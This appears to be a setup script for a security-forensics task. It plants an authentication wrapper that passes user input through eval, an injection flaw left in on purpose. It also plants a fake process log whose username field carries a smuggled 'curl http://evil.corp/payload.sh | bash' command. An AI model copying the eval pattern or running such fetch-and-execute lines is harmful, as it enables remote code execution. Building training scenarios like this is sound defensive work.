#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/evidence

    cat << 'EOF' > /home/user/evidence/auth_wrapper.sh
#!/bin/bash
# Auth Wrapper Script v1.2
# Validates user authentication against legacy backend

USERNAME=$1
AUTH_TOKEN=$2

if [ -z "$USERNAME" ] || [ -z "$AUTH_TOKEN" ]; then
    echo "Usage: $0 <user> <base64_token>"
    exit 1
fi

DECODED_TOKEN=$(echo "$AUTH_TOKEN" | base64 -d)

# The following line executes the backend validator
eval "/opt/backend/validate --user $USERNAME --token $DECODED_TOKEN"

echo "Auth process finished."
EOF

    cat << 'EOF' > /home/user/evidence/ps_dump.log
  PID CMD
 1001 /bin/bash ./auth_wrapper.sh system c3lzdGVtOmRlZmF1bHQ=
 1005 /bin/bash ./auth_wrapper.sh guest Z3Vlc3Q6Z3Vlc3Q=
 1012 /bin/bash ./auth_wrapper.sh admin YWRtaW46c2VjcmV0MTIz
 1109 /bin/bash ./auth_wrapper.sh testuser;curl http://evil.corp/payload.sh | bash; bWFsX2F0dGFja2VyX3Rva2VuXzg4NA==
 1115 /bin/bash ./auth_wrapper.sh backup YmFja3VwOmJhY2t1cDIwMjM=
EOF

    chmod 755 /home/user/evidence/auth_wrapper.sh
    chmod 644 /home/user/evidence/ps_dump.log

    chmod -R 777 /home/user
